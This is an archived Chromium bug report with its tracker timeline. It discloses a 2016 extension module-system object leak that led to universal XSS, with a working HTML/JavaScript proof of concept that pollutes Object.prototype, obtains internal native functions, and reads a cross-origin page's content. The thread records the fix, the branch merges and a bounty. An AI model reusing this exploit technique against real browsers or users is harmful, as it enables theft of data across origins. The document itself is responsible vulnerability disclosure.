# Internal object leak in ModuleSystem::RequireForJsInner => Universal XSS

| Field | Value |
|-------|-------|
| **Issue ID** | [40083765](https://issues.chromium.org/issues/40083765) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Reporter** | se...@gmail.com |
| **Assignee** | rd...@chromium.org |
| **Created** | 2016-02-26 |
| **Bounty** | $7,500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36

Steps to reproduce the problem:

What is the expected behavior?

What went wrong?
in src/extensions/renderer/module_system.cc:234:
v8::Local<v8::Value> ModuleSystem::RequireForJsInner(
    v8::Local<v8::String> module_name) {
...
  v8::Local<v8::Value> modules_value;
  if (!GetPrivate(global, kModulesField, &modules_value) ||
      modules_value->IsUndefined()) {
    Warn(GetIsolate(), "Extension view no longer exists");
    return v8::Undefined(GetIsolate());
  }

  v8::Local<v8::Object> modules(v8::Local<v8::Object>::Cast(modules_value));
  v8::Local<v8::Value> exports;
  if (!GetProperty(v8_context, modules, module_name, &exports) ||
      !exports->IsUndefined())
    return handle_scope.Escape(exports);

  exports = LoadModule(*v8::String::Utf8Value(module_name));
  SetProperty(v8_context, modules, module_name, exports);
  return handle_scope.Escape(exports);
}

|RequireForJsInner| calls |GetProperty| on the internal object that is used to store
exported functions for the module system. A getter function defined on Object.prototype
could leak that object.

Repro:
<body>
<script>
//get the export container
leaked = [];
Object.defineProperty(Object.prototype, "runtime", {get: function () {
    leaked.push(this);
  },
  set: function (v) {
    Object.defineProperty(this, "runtime", {
      value: v,
      configurable: true,
      enumerable: true,
      writable: true
    } )
  },
  configurable: true } );
try {
  chrome.runtime;
} catch (e) { }
delete Object.prototype.runtime;

//get chrome.test
delete leaked[0].utils.loadTypeSchema;
leaked[0].utils.loadTypeSchema = function () { return {js_module: "test"} };
realGenerate = leaked[0].binding.Binding.prototype.generate;
Object.prototype.__defineGetter__ = function (name, func) {
  if (name != "isInstalled")
    return;

  originalRegisterCustomHook = leaked[0].binding.Binding.prototype.registerCustomHook;
  leaked[0].binding.Binding.prototype.registerCustomHook = function (func) {
    leakedCustomHook = func;
    Object.prototype.test = {};
    return originalRegisterCustomHook.apply(this, arguments);
  }

  leaked[0].binding.Binding.prototype.generate.call(
    {schema_:
      {unprivileged: true,
        namespace: "runtime",
        properties: {"lastError": {
          value: {},
          $ref: {}
          } 
        }
      }
    }
  );
};
try {
  chrome.app;
} catch (e) {}
delete Object.prototype.test;
leakedFuncs = {};
obj = {
  compiledApi: {},
  apiFunctions: {
    setHandleRequest: function (name, func) {
      leakedFuncs[name] = func;
    }
  }};
leakedCustomHook(obj);

//get GetGlobal
moduleSystem = leakedFuncs.getModuleSystem(window);
leakedFuncs.runWithNativesEnabled(function() {
  sendRequest = moduleSystem.requireNative("sendRequest");
});

//get the other window's document
frame = document.body.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/intl/en/ads/";
frame.onload = function () {
  loc = frame.contentWindow.location;

  frame.src = "data:,foo";
  frame.onload = function () {
    glob = sendRequest.GetGlobal(loc);
    alert(glob.document.body.innerHTML);
  };
}
</script>
</body>

To demonstrate UXSS the repro case leaks the "test" module to obtain the |getModuleSystem|
function and then the |GetGlobal| function, which is used the same way as in https://crbug.com/chromium/546677.

Version:
Google Chrome 48.0.2564.116 (Official Build) m (64-bit)
Google Chrome 50.0.2660.3 (Official Build) canary (64-bit)

--

I would like to remain anonymous for this report.

Did this work before? N/A 

Chrome version: 48.0.2564.116  Channel: n/a
OS Version: 6.3
Flash Version: Shockwave Flash 20.0 r0

## Timeline

### oc...@chromium.org (2016-02-26)

Thank you for yet another great report!

rdevlin.cronin, mind taking a look at this?

### oc...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

[Monorail components: Platform>Extensions]

### oc...@chromium.org (2016-02-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-29)

[Empty comment from Monorail migration]

### rd...@chromium.org (2016-03-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### rd...@chromium.org (2016-03-10)

Revision 75b803b1c81ed9fa5513cbff550232b4fb915e7b addresses this, and this no longer repros.  I think we can close this.

### cl...@chromium.org (2016-03-11)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2016-03-24)

Merge Request for M50

(rdevlin.cronin@ - please request merge to M49 after M50 is approved and lands)

### ti...@google.com (2016-03-25)

Your change meets the bar and is auto-approved for M50 (branch: 2661)

### go...@chromium.org (2016-03-25)

Please merge your change to M50 branch (2661) by EOD Monday(03/28), so we can take it for next week beta cut. Thank you.

### rd...@chromium.org (2016-03-25)

This was already merged to M50 by revision 8a4fb2b8eea970c5a69ca00bf562c7803806af03, which addressed this bug and https://crbug.com/chromium/590118 (I'm still very confused as to why we don't see auto updates by commit bot on some of these security issues - does it have permission to comment on securityembargo ones?).

### go...@chromium.org (2016-03-25)

Thank you rdevlin.cronin@. May be tinazh@ or timwillis@ can answer your question.

As this is already merged to M50 branch 2661, removing "Merge-Approved-50" label. 

### mb...@chromium.org (2016-04-12)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-04-12)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-04-13)

Thanks for the report! This one qualified for a $7500 reward.

### ti...@google.com (2016-04-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/590275?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### ww...@gmail.com (2025-07-16)

deleted

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083765)*
